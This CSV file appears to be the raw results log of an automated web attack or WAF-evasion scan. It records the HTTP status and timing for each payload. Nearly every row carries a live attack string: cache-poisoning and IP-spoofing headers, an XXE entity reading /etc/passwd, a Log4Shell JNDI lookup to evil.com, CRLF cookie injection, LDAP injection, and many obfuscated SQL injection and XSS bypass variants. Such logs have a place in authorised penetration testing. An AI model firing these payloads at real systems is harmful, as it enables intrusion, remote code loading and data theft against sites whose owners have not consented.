Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"Web Cache Poisoning","DELETE",404,697,"Cache-Control: no-cache",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,726,"X-Forwarded-Proto: https",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,757,"X-Forwarded-Proto: https",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,974,"X-Forwarded-Proto: https",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,1006,"X-Forwarded-Proto: https",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,1037,"X-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,1251,"X-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,1462,"X-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,1498,"X-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,1529,"X-Forwarded-Scheme: javascript://",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,1560,"X-Forwarded-Scheme: javascript://",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,1767,"X-Forwarded-Scheme: javascript://",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,1802,"X-Forwarded-Scheme: javascript://",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,2014,"X-HTTP-Method-Override: PURGE",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,2232,"X-HTTP-Method-Override: PURGE",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,2265,"X-HTTP-Method-Override: PURGE",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,213,"X-HTTP-Method-Override: PURGE",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,423,"X-Forwarded-Server: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,632,"X-Forwarded-Server: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,662,"X-Forwarded-Server: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,878,"X-Forwarded-Server: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,908,"X-Forwarded-Port: 443",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,941,"X-Forwarded-Port: 443",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,1156,"X-Forwarded-Port: 443",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,1199,"X-Forwarded-Port: 443",false,false,"Unknown","",""
"Web Cache Poisoning","GET",200,1230,"X-Original-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","POST",404,1258,"X-Original-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","PUT",404,1466,"X-Original-Host: evil.com",false,false,"Unknown","",""
"Web Cache Poisoning","DELETE",404,1682,"X-Original-Host: evil.com",false,false,"Unknown","",""
"IP Bypass","GET",200,1896,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","POST",404,2111,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,2721,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,2930,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,2961,"X-Remote-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","POST",404,3176,"X-Remote-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,3218,"X-Remote-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,31,"X-Remote-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,246,"X-Remote-Addr: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","POST",404,467,"X-Remote-Addr: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,682,"X-Remote-Addr: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,714,"X-Remote-Addr: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,937,"X-Client-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","POST",404,1159,"X-Client-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,1367,"X-Client-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,1581,"X-Client-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,1609,"X-Real-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,1611,"X-Real-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,1613,"X-Real-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","POST",404,1795,"X-Real-IP: 127.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,1804,"X-Forwarded-For: 127.0.0.1, evil.com",false,false,"Unknown","",""
"IP Bypass","POST",404,1833,"X-Forwarded-For: 127.0.0.1, evil.com",false,false,"Unknown","",""
"IP Bypass","PUT",404,1861,"X-Forwarded-For: 127.0.0.1, evil.com",false,false,"Unknown","",""
"IP Bypass","DELETE",404,1891,"X-Forwarded-For: 127.0.0.1, evil.com",false,false,"Unknown","",""
"IP Bypass","GET",200,2107,"X-Forwarded-For: 127.0.0.1, 2130706433",false,false,"Unknown","",""
"IP Bypass","POST",404,2139,"X-Forwarded-For: 127.0.0.1, 2130706433",false,false,"Unknown","",""
"IP Bypass","PUT",404,2352,"X-Forwarded-For: 127.0.0.1, 2130706433",false,false,"Unknown","",""
"IP Bypass","DELETE",404,215,"X-Forwarded-For: 127.0.0.1, 2130706433",false,false,"Unknown","",""
"IP Bypass","GET",200,246,"X-Forwarded-For: 127.0.0.1, localhost",false,false,"Unknown","",""
"IP Bypass","POST",404,275,"X-Forwarded-For: 127.0.0.1, localhost",false,false,"Unknown","",""
"IP Bypass","PUT",404,307,"X-Forwarded-For: 127.0.0.1, localhost",false,false,"Unknown","",""
"IP Bypass","DELETE",404,517,"X-Forwarded-For: 127.0.0.1, localhost",false,false,"Unknown","",""
"IP Bypass","GET",200,555,"X-Forwarded-For: 127.0.0.1, 0.0.0.0",false,false,"Unknown","",""
"IP Bypass","POST",404,586,"X-Forwarded-For: 127.0.0.1, 0.0.0.0",false,false,"Unknown","",""
"IP Bypass","PUT",404,623,"X-Forwarded-For: 127.0.0.1, 0.0.0.0",false,false,"Unknown","",""
"IP Bypass","DELETE",404,840,"X-Forwarded-For: 127.0.0.1, 0.0.0.0",false,false,"Unknown","",""
"IP Bypass","GET",200,1058,"X-Forwarded-For: 127.0.0.1, ::1",false,false,"Unknown","",""
"IP Bypass","POST",404,1093,"X-Forwarded-For: 127.0.0.1, ::1",false,false,"Unknown","",""
"IP Bypass","PUT",404,1123,"X-Forwarded-For: 127.0.0.1, ::1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,1152,"X-Forwarded-For: 127.0.0.1, ::1",false,false,"Unknown","",""
"IP Bypass","GET",200,1367,"X-Forwarded-For: 127.0.0.1, 0177.0.0.1",false,false,"Unknown","",""
"IP Bypass","POST",404,1578,"X-Forwarded-For: 127.0.0.1, 0177.0.0.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,1613,"X-Forwarded-For: 127.0.0.1, 0177.0.0.1",false,false,"Unknown","",""
"IP Bypass","DELETE",404,1643,"X-Forwarded-For: 127.0.0.1, 0177.0.0.1",false,false,"Unknown","",""
"IP Bypass","GET",200,1856,"X-Forwarded-For: 127.0.0.1, 127.1",false,false,"Unknown","",""
"IP Bypass","POST",404,2066,"X-Forwarded-For: 127.0.0.1, 127.1",false,false,"Unknown","",""
"IP Bypass","PUT",404,2276,"X-Forwarded-For: 127.0.0.1, 127.1",false,false,"Unknown","",""
"User-Agent","GET",ERR,0,"User-Agent:  ",false,false,"Unknown","",""
"User-Agent","POST",ERR,0,"User-Agent:  ",false,false,"Unknown","",""
"User-Agent","PUT",ERR,0,"User-Agent:  ",false,false,"Unknown","",""
"User-Agent","DELETE",ERR,0,"User-Agent:  ",false,false,"Unknown","",""
"IP Bypass","DELETE",404,30,"X-Forwarded-For: 127.0.0.1, 127.1",false,false,"Unknown","",""
"User-Agent","GET",200,70,"User-Agent:",false,false,"Unknown","",""
"User-Agent","POST",404,290,"User-Agent:",false,false,"Unknown","",""
"User-Agent","PUT",404,506,"User-Agent:",false,false,"Unknown","",""
"User-Agent","DELETE",404,535,"User-Agent:",false,false,"Unknown","",""
"User-Agent","GET",200,578,"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",false,false,"Unknown","",""
"User-Agent","POST",404,612,"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",false,false,"Unknown","",""
"User-Agent","PUT",404,827,"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",false,false,"Unknown","",""
"User-Agent","DELETE",404,857,"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)",false,false,"Unknown","",""
"User-Agent","GET",200,1075,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"User-Agent","POST",404,1108,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"User-Agent","PUT",404,1138,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"User-Agent","DELETE",404,1363,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"User-Agent","GET",200,1399,"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"User-Agent","POST",404,1615,"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"User-Agent","PUT",404,1824,"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"User-Agent","DELETE",404,214,"User-Agent: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",false,false,"Unknown","",""
"User-Agent","GET",403,241,"User-Agent: <script>alert('xss')</script>",false,false,"Unknown","",""
"User-Agent","POST",404,450,"User-Agent: <script>alert('xss')</script>",false,false,"Unknown","",""
"User-Agent","PUT",404,493,"User-Agent: <script>alert('xss')</script>",false,false,"Unknown","",""
"User-Agent","DELETE",403,725,"User-Agent: <script>alert('xss')</script>",false,false,"Unknown","",""
"User-Agent","GET",200,952,"User-Agent: %0d%0aSet-Cookie: injected=true",false,false,"Unknown","",""
"User-Agent","POST",404,983,"User-Agent: %0d%0aSet-Cookie: injected=true",false,false,"Unknown","",""
"User-Agent","PUT",404,1199,"User-Agent: %0d%0aSet-Cookie: injected=true",false,false,"Unknown","",""
"User-Agent","DELETE",404,1228,"User-Agent: %0d%0aSet-Cookie: injected=true",false,false,"Unknown","",""
"User-Agent","GET",200,1437,"User-Agent: ' OR '1'='1",false,false,"Unknown","",""
"User-Agent","POST",404,1470,"User-Agent: ' OR '1'='1",false,false,"Unknown","",""
"User-Agent","PUT",404,1504,"User-Agent: ' OR '1'='1",false,false,"Unknown","",""
"User-Agent","DELETE",404,1536,"User-Agent: ' OR '1'='1",false,false,"Unknown","",""
"User-Agent","GET",200,1753,"User-Agent: *)(uid=*))(|(uid=*)",false,false,"Unknown","",""
"User-Agent","POST",404,1969,"User-Agent: *)(uid=*))(|(uid=*)",false,false,"Unknown","",""
"User-Agent","PUT",404,2009,"User-Agent: *)(uid=*))(|(uid=*)",false,false,"Unknown","",""
"User-Agent","DELETE",404,2041,"User-Agent: *)(uid=*))(|(uid=*)",false,false,"Unknown","",""
"User-Agent","GET",403,2048,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"User-Agent","POST",403,2054,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"User-Agent","PUT",403,2060,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"User-Agent","DELETE",403,7,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"User-Agent","GET",200,253,"User-Agent: Fuzz Faster U Fool",false,false,"Unknown","",""
"User-Agent","POST",404,285,"User-Agent: Fuzz Faster U Fool",false,false,"Unknown","",""
"User-Agent","PUT",404,315,"User-Agent: Fuzz Faster U Fool",false,false,"Unknown","",""
"User-Agent","DELETE",404,525,"User-Agent: Fuzz Faster U Fool",false,false,"Unknown","",""
"User-Agent","GET",200,556,"User-Agent: feroxbuster/2.10.0",false,false,"Unknown","",""
"User-Agent","POST",404,771,"User-Agent: feroxbuster/2.10.0",false,false,"Unknown","",""
"User-Agent","PUT",404,1048,"User-Agent: feroxbuster/2.10.0",false,false,"Unknown","",""
"User-Agent","DELETE",404,1264,"User-Agent: feroxbuster/2.10.0",false,false,"Unknown","",""
"User-Agent","GET",200,1299,"User-Agent: gobuster/3.1.0",false,false,"Unknown","",""
"User-Agent","POST",404,1329,"User-Agent: gobuster/3.1.0",false,false,"Unknown","",""
"User-Agent","PUT",404,1360,"User-Agent: gobuster/3.1.0",false,false,"Unknown","",""
"User-Agent","DELETE",404,1584,"User-Agent: gobuster/3.1.0",false,false,"Unknown","",""
"User-Agent","GET",200,1794,"User-Agent: Firefox",false,false,"Unknown","",""
"User-Agent","POST",404,2001,"User-Agent: Firefox",false,false,"Unknown","",""
"User-Agent","PUT",404,2033,"User-Agent: Firefox",false,false,"Unknown","",""
"User-Agent","DELETE",404,2072,"User-Agent: Firefox",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,2111,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,2144,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2174,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,219,"%2527%2520OR%25201%253D1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,251,"%252527%252520OR%252520%2527a%252527%253D%252527a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,282,"%252527%252520OR%252520%2527a%252527%253D%252527a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,490,"%252527%252520OR%252520%2527a%252527%253D%252527a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,523,"%252527%252520OR%252520%2527a%252527%253D%252527a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,733,"\u0027\u0020OR\u0020\u0027a\u0027\u003D\u0027a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,766,"\u0027\u0020OR\u0020\u0027a\u0027\u003D\u0027a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,802,"\u0027\u0020OR\u0020\u0027a\u0027\u003D\u0027a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1015,"\u0027\u0020OR\u0020\u0027a\u0027\u003D\u0027a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1050,"\u0027\u0020UNION\u0020SELECT\u0020null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1078,"\u0027\u0020UNION\u0020SELECT\u0020null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1309,"\u0027\u0020UNION\u0020SELECT\u0020null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1532,"\u0027\u0020UNION\u0020SELECT\u0020null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1561,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1768,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1796,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1824,"'/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1859,"'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1888,"'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2104,"'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,207,"'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,423,"admin'/**/--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,630,"admin'/**/--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,660,"admin'/**/--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,874,"admin'/**/--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,906,"%2527/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1126,"%2527/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1343,"%2527/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1371,"%2527/**/OR/**/1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1400,"\u0027/**/UNION/**/SELECT/**/null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1614,"\u0027/**/UNION/**/SELECT/**/null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1830,"\u0027/**/UNION/**/SELECT/**/null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1860,"\u0027/**/UNION/**/SELECT/**/null--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,2080,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,2108,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2322,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,2537,"'%09OR%091=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,2747,"'%0AOR%0A1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,2963,"'%0AOR%0A1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2994,"'%0AOR%0A1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,32,"'%0AOR%0A1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,64,"'%0DOR%0D1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,94,"'%0DOR%0D1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,302,"'%0DOR%0D1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,336,"'%0DOR%0D1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,554,"'%A0OR%A01=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,765,"'%A0OR%A01=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,800,"'%A0OR%A01=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,834,"'%A0OR%A01=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1051,"'||'a'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1080,"'||'a'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1108,"'||'a'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1318,"'||'a'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1348,"'||(SELECT'a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1385,"'||(SELECT'a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1430,"'||(SELECT'a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1458,"'||(SELECT'a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1678,"'+(SELECT'a')+'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1909,"'+(SELECT'a')+'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2128,"'+(SELECT'a')+'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,28,"'+(SELECT'a')+'='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,238,"'CONCAT('a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,277,"'CONCAT('a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,491,"'CONCAT('a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,526,"'CONCAT('a')='a",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,744,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,779,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,808,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1023,"0x27204f52203120314431--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1238,"CHAR(39)+OR+1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1267,"CHAR(39)+OR+1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1296,"CHAR(39)+OR+1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1504,"CHAR(39)+OR+1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1535,"CHR(39)||OR||1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1742,"CHR(39)||OR||1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1953,"CHR(39)||OR||1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1982,"CHR(39)||OR||1=1--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,2011,"'%2BSLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,2040,"'%2BSLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2071,"'%2BSLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,216,"'%2BSLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,246,"'/**/AND/**/SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,460,"'/**/AND/**/SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,668,"'/**/AND/**/SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,875,"'/**/AND/**/SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,906,"'\u0020AND\u0020SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,946,"'\u0020AND\u0020SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1169,"'\u0020AND\u0020SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1382,"'\u0020AND\u0020SLEEP(5)--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1607,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1646,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,1675,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,1884,"'UNION/*!50000SELECT*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","GET",200,1913,"'UNION/*#*/SELECT/*#*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","POST",404,1942,"'UNION/*#*/SELECT/*#*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","PUT",404,2157,"'UNION/*#*/SELECT/*#*/1,2,3--",false,false,"Unknown","",""
"SQL Injection - Advanced Bypass","DELETE",404,2188,"'UNION/*#*/SELECT/*#*/1,2,3--",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,2403,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,2430,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,2459,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,206,"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,235,"<svg onload=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,446,"<svg onload=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,477,"<svg onload=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,505,"<svg onload=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,745,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,773,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,804,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1010,"%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1226,"%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1432,"%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1639,"%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1846,"%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1879,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,2099,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,2313,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
